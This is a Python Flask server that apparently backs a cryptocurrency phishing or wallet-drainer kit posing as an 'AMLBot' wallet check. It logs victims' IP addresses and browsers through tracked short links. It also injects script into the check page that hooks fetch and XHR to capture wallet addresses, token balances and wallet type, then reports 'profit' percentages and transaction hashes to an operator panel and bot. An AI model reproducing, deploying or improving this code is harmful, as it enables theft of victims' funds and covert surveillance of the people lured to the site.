"""
server_aml.py — AMLBot client site
Port 8080  → http://localhost:8080
Serves: sam-drin/ static site + short-link routing with wallet-tracking injection.
Shares data/links.json and data/logs.json with server_panel.py.
"""

from flask import Flask, send_from_directory, Response, request
import json
import os
import re
import time
import urllib.request as _urllib_req

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SAM_DIR  = os.path.join(os.path.dirname(BASE_DIR), 'sam-drin')
DATA_DIR = os.path.join(BASE_DIR, 'data')

# URL of the panel's log endpoint (server_panel.py on port 8081)
PANEL_LOG_URL = 'http://127.0.0.1:8081/api/log.php'

app = Flask(__name__)

_STATIC_EXTS = {
    '.css', '.js', '.mjs', '.map',
    '.png', '.jpg', '.jpeg', '.gif', '.svg', '.webp', '.ico',
    '.woff', '.woff2', '.ttf', '.eot', '.json',
}

# ---------------------------------------------------------------------------
# Data helpers (shared JSON files with server_panel.py)
# ---------------------------------------------------------------------------

def _load(name):
    path = os.path.join(DATA_DIR, name)
    if not os.path.isfile(path):
        return []
    with open(path, 'r', encoding='utf-8') as f:
        txt = f.read().strip()
    return json.loads(txt) if txt else []


def _save(name, data):
    os.makedirs(DATA_DIR, exist_ok=True)
    with open(os.path.join(DATA_DIR, name), 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)


def find_link(code):
    for lnk in _load('links.json'):
        if lnk.get('code') == code:
            return lnk
    return None


def record_click(code):
    now = time.strftime('%Y-%m-%d %H:%M:%S')

    # Grab visitor info from current request context
    fwd = request.headers.get('X-Forwarded-For', '')
    real_ip = fwd.split(',')[0].strip() if fwd else (request.headers.get('X-Real-IP', '') or request.remote_addr or '')
    visitor_ua = request.headers.get('User-Agent', '')
    visitor_dom = request.host or ''

    logs = _load('logs.json')
    logs.append({
        'id': len(logs) + 1,
        'date': now, 'type': 'click',
        'address': '', 'balance': 0, 'profit': 0,
        'link_code': code, 'country': 'N/A', 'source': 'aml',
        'ip': real_ip, 'ua': visitor_ua, 'domain': visitor_dom,
    })
    _save('logs.json', logs)

    links = _load('links.json')
    for lnk in links:
        if lnk.get('code') == code:
            visits = lnk.get('visits', [])
            visits.append({'date': now, 'type': 'click', 'country': 'N/A', 'source': 'aml'})
            lnk['visits'] = visits[-100:]
            lnk['clicks'] = lnk.get('clicks', 0) + 1
            break
    _save('links.json', links)

    # Forward click event to panel so the bot gets notified
    try:
        payload = json.dumps({
            'type': 'click', 'link_code': code,
            'address': '', 'balance': 0, 'profit': 0, 'source': 'aml',
            'ip': real_ip, 'ua': visitor_ua, 'domain': visitor_dom,
        }).encode('utf-8')
        req = _urllib_req.Request(
            PANEL_LOG_URL,
            data=payload,
            headers={'Content-Type': 'application/json'},
            method='POST'
        )
        _urllib_req.urlopen(req, timeout=2)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Tracking script injected into checking.html
# Injected into </head> so it runs BEFORE the deferred page2.bundle.js.
# 1. Sets up localStorage so the bundle knows which panel link this visit is.
# 2. Hooks window.fetch to intercept the zapexobmen.com/api/check.php call
#    and extract wallet address + balance from the FormData fields.
# 3. Sets up a MutationObserver to fire a "profit" log when the result
#    step (div id="4") becomes visible.
# ---------------------------------------------------------------------------

def make_set_ls(code):
    """Small inject for index.html: sets localStorage tracking keys.
    Browser events are sent to /api/log.php on this server (AML server),
    which proxies them to server_panel with the real visitor IP.
    """
    c = code
    # Use absolute path on the AML server — avoids any cross-origin issue
    # and ensures the real browser IP is captured server-side
    a = '/api/log.php'
    return (
        '<script>(function(){'
        'try{'
        'localStorage.setItem("_panel_link","' + c + '");'
        'localStorage.setItem("_panel_api","' + a + '");'
        '}catch(e){}'
        '})();</script>'
    )


def make_inject_ls():
    """Full tracking inject for checking.html — reads code/api from localStorage."""
    return (
        '<script>(function(){'
        'var _c,_a;'
        'try{_c=localStorage.getItem("_panel_link")||"";'
        '_a=localStorage.getItem("_panel_api")||"";'
        '}catch(e){_c="";_a="";}'
        'if(!_c||!_a)return;'

        # capture UA and domain once
        'var _ua=navigator.userAgent||"";'
        'var _dom=window.location.hostname||"";'

        # _send(type, addr, bal, pct, extraObj)
        'function _send(t,addr,bal,pct,ext){'
        'var o={type:t,link_code:_c,address:addr||"",balance:bal||0,profit:pct||0,source:"aml",ua:_ua,domain:_dom};'
        'if(ext){for(var k in ext)o[k]=ext[k];}'
        'fetch(_a,{method:"POST",headers:{"Content-Type":"application/json"},'
        'body:JSON.stringify(o),mode:"cors"}).catch(function(){});}'

        # Hook window.fetch
        'var _of=window.fetch,_sc=false,_wlt="";'
        'window.fetch=function(url,opts){'
        'var u=typeof url==="string"?url:(url&&url.url)||"";'

        # --- Redirect CoinGecko price API through local proxy ---
        'if(u.indexOf("api.coingecko.com")!==-1){'
        'var _qs=u.indexOf("?")!==-1?u.slice(u.indexOf("?")):"";'
        'return _of.call(this,"/proxy/coingecko"+_qs,{method:"GET"});'
        '}'

        # --- Intercept config.php: redirect to local proxy to fix CORS ---
        'if(u.indexOf("config.php")!==-1&&u.charAt(0)!=="/"&&u.indexOf(window.location.host)===-1){'
        'return _of.call(this,"/config.php",{method:"GET"});'
        '}'

        # --- Intercept api/check.php to capture connect event ---
        'if(!_sc&&u.indexOf("api/check.php")!==-1){'
        'try{'
        'var b=opts&&opts.body;'
        'if(b instanceof FormData){'
        'var addr=b.get("address")||"";'
        'var user_ip=b.get("ip")||"";'
        'var tkn={};'
        '["trx","usdt","usdc","eth","bnb","ton","btc","matic","sol"].forEach(function(n){'
        'var v=parseFloat(b.get(n+"_balance")||0)||0;if(v>0)tkn[n.toUpperCase()]=v;});'
        'var bal=Object.keys(tkn).reduce(function(s,k){return s+tkn[k];},0)||parseFloat(b.get("amount")||0)||0;'
        '_wlt=b.get("wallet_name")||b.get("wallet_type")||b.get("wallet")||b.get("provider")||"";'
        'if(addr){_sc=true;_send("connect",addr,bal,0,{tokens:tkn,wallet:_wlt,user_ip:user_ip});}'
        '}'
        '}catch(e){}}'
        'return _of.apply(this,arguments);};'

        # XHR hook — intercepts axios/trongrid calls (axios uses XMLHttpRequest, not fetch)
        'var _XO=XMLHttpRequest.prototype.open;'
        'XMLHttpRequest.prototype.open=function(m,u,a,b,c){'
        'if(typeof u==="string"&&u.indexOf("api.trongrid.io")!==-1){'
        'u=u.replace("https://api.trongrid.io","/proxy/trongrid");'
        '}'
        'return _XO.call(this,m,u,a,b,c);};'

        # MutationObserver: fire "profit" when result step (div#4) shows
        'var _sp=false;'
        'function _watch(){'
        'new MutationObserver(function(ms){'
        'ms.forEach(function(m){'
        'if(m.target.id==="4"&&m.target.style.display!=="none"&&!_sp){'
        '_sp=true;'
        'var el=m.target.querySelector(".percent");'
        'var pct=el?parseFloat(el.textContent)||0:0;'
        # Look for tx hash in links (64/66 hex chars) or data attributes
        'var txh="";'
        'var als=m.target.querySelectorAll("a[href]");'
        'for(var i=0;i<als.length;i++){'
        'var hr=als[i].getAttribute("href")||"";'
        'var mx=hr.match(/[0-9a-fA-F]{64}/);'
        'if(mx){txh=mx[0];break;}}'
        'if(!txh){var mx2=(m.target.textContent||"").match(/\\b[0-9a-fA-F]{64}\\b/);if(mx2)txh=mx2[0];}'
        '_send("profit","",0,pct,{tx_hash:txh,wallet:_wlt});}});'
        '}).observe(document.body,{subtree:true,attributes:true,'
        'attributeFilter:["style"]});}'
        'if(document.readyState==="loading"){'
        'document.addEventListener("DOMContentLoaded",_watch);}else{_watch();}'
        '})();</script>'
    )


# ---------------------------------------------------------------------------
# Proxy: browser events → server_panel.py with real IP
# Browser sends connect/profit events here (same-origin, no CORS issue).
# We inject the real visitor IP and forward to the panel.
# ---------------------------------------------------------------------------

@app.route('/api/log.php', methods=['POST', 'OPTIONS'])
def proxy_log():
    if request.method == 'OPTIONS':
        resp = Response()
        resp.headers['Access-Control-Allow-Origin']  = '*'
        resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        return resp, 204

    # Real visitor IP
    fwd    = request.headers.get('X-Forwarded-For', '')
    real_ip = fwd.split(',')[0].strip() if fwd else (
        request.headers.get('X-Real-IP', '') or request.remote_addr or ''
    )

    try:
        data = request.get_json() or {}
    except Exception:
        data = {}

    # Prefer the real external IP that the bundle fetched from api.ipify.org
    # (it puts it into FormData['ip'], which we extract in the inject hook as 'user_ip')
    best_ip = data.get('user_ip') or data.get('ip') or real_ip
    data['ip'] = best_ip
    if not data.get('ua'):
        data['ua'] = request.headers.get('User-Agent', '')

    try:
        payload = json.dumps(data).encode('utf-8')
        req = _urllib_req.Request(
            PANEL_LOG_URL,
            data=payload,
            headers={'Content-Type': 'application/json'},
            method='POST',
        )
        _urllib_req.urlopen(req, timeout=3)
    except Exception:
        pass

    resp = Response(json.dumps({'ok': True}), mimetype='application/json')
    resp.headers['Access-Control-Allow-Origin'] = '*'
    return resp


# Proxy config.php — fixes CORS block that causes the infinite loading spinner
@app.route('/config.php', methods=['GET', 'OPTIONS'])
def proxy_config():
    if request.method == 'OPTIONS':
        resp = Response()
        resp.headers['Access-Control-Allow-Origin'] = '*'
        return resp, 204
    try:
        req = _urllib_req.Request(
            'https://zapexobmen.com/config.php',
            headers={'User-Agent': 'Mozilla/5.0'}
        )
        with _urllib_req.urlopen(req, timeout=4) as r:
            data = r.read()
    except Exception:
        data = b'{}'
    resp = Response(data, mimetype='application/json')
    resp.headers['Access-Control-Allow-Origin'] = '*'
    return resp


# Proxy CoinGecko — CORS-blocked from browser when served from non-whitelisted origin
@app.route('/proxy/coingecko', methods=['GET', 'OPTIONS'])
def proxy_coingecko():
    if request.method == 'OPTIONS':
        resp = Response()
        resp.headers['Access-Control-Allow-Origin'] = '*'
        return resp, 204
    qs = request.query_string.decode('utf-8')
    try:
        req = _urllib_req.Request(
            f'https://api.coingecko.com/api/v3/simple/price?{qs}',
            headers={'User-Agent': 'Mozilla/5.0'}
        )
        with _urllib_req.urlopen(req, timeout=5) as r:
            data = r.read()
    except Exception:
        # Fallback hardcoded prices so page doesn't hang
        data = b'{"tron":{"usd":0.31},"tether":{"usd":1.0}}'
    resp = Response(data, mimetype='application/json')
    resp.headers['Access-Control-Allow-Origin'] = '*'
    return resp


# Proxy TronGrid — forwards wallet/contract API calls; avoids rate-limit issues
# when browser hits trongrid directly from localhost/unlisted origin
@app.route('/proxy/trongrid/<path:subpath>', methods=['GET', 'POST', 'OPTIONS'])
def proxy_trongrid(subpath):
    if request.method == 'OPTIONS':
        resp = Response()
        resp.headers['Access-Control-Allow-Origin'] = '*'
        resp.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
        resp.headers['Access-Control-Allow-Headers'] = 'Content-Type, TRON-PRO-API-KEY'
        return resp, 204
    qs = request.query_string.decode('utf-8')
    url = f'https://api.trongrid.io/{subpath}'
    if qs:
        url += '?' + qs
    try:
        body = request.get_data() if request.method == 'POST' else None
        hdrs = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': request.content_type or 'application/json',
        }
        api_key = request.headers.get('TRON-PRO-API-KEY', '')
        if api_key:
            hdrs['TRON-PRO-API-KEY'] = api_key
        req = _urllib_req.Request(url, data=body, headers=hdrs, method=request.method)
        with _urllib_req.urlopen(req, timeout=6) as r:
            data = r.read()
    except Exception:
        data = b'{}'
    resp = Response(data, mimetype='application/json')
    resp.headers['Access-Control-Allow-Origin'] = '*'
    return resp


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@app.route('/')
@app.route('/index.html')
def root():
    return send_from_directory(SAM_DIR, 'index.html')


@app.route('/<path:path>')
def serve(path):
    _, ext = os.path.splitext(path)

    # --- checking_files/ subfolder (CSS files checking.html references) -----
    if path.startswith('verification/checking_files/'):
        # Return empty CSS to suppress 404 noise; these are non-critical styles
        return Response('', mimetype='text/css', status=200)

    # --- Static assets -------------------------------------------------------
    if ext.lower() in _STATIC_EXTS:
        # 1. sam-drin root
        f = os.path.join(SAM_DIR, path)
        if os.path.isfile(f):
            return send_from_directory(SAM_DIR, path)
        # 2. sam-drin/verification/ (e.g. page2.bundle.js, page2.css, images/)
        vf = os.path.join(SAM_DIR, 'verification', path)
        if os.path.isfile(vf):
            return send_from_directory(os.path.join(SAM_DIR, 'verification'), path)
        # 3. Path with subdirs (e.g. _next/static/…)
        for root_dir in (SAM_DIR,):
            full = os.path.join(root_dir, path)
            if os.path.isfile(full):
                return send_from_directory(root_dir, path)
        return '', 404

    # --- checking.html — always inject tracking (reads code from localStorage) ---
    if path.lower() in ('verification/checking.html',):
        checking = os.path.join(SAM_DIR, 'verification', 'checking.html')
        with open(checking, 'r', encoding='utf-8') as f:
            html = f.read()
        html = html.replace('</head>', make_inject_ls() + '</head>', 1)
        return Response(html, mimetype='text/html')

    # --- Short-link codes (8-16 alphanumeric chars) --------------------------
    # Sends user to sam-drin index.html; tracking code is set via localStorage
    if re.fullmatch(r'[A-Za-z0-9_-]{8,16}', path):
        if find_link(path):
            record_click(path)
            index = os.path.join(SAM_DIR, 'index.html')
            with open(index, 'r', encoding='utf-8') as f:
                html = f.read()
            html = html.replace('</head>', make_set_ls(path) + '</head>', 1)
            return Response(html, mimetype='text/html')
        return '', 404

    # --- Everything else: serve from sam-drin or fall back to index ----------
    full = os.path.join(SAM_DIR, path)
    if os.path.isfile(full):
        return send_from_directory(SAM_DIR, path)
    return send_from_directory(SAM_DIR, 'index.html')


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == '__main__':
    os.makedirs(DATA_DIR, exist_ok=True)
    print('🌐  AML-сайт запущен: http://localhost:8080')
    print(f'📁  Сайт: {SAM_DIR}')
    print(f'📡  Логи → {PANEL_LOG_URL}')
    app.run(host='0.0.0.0', port=8080, debug=False)
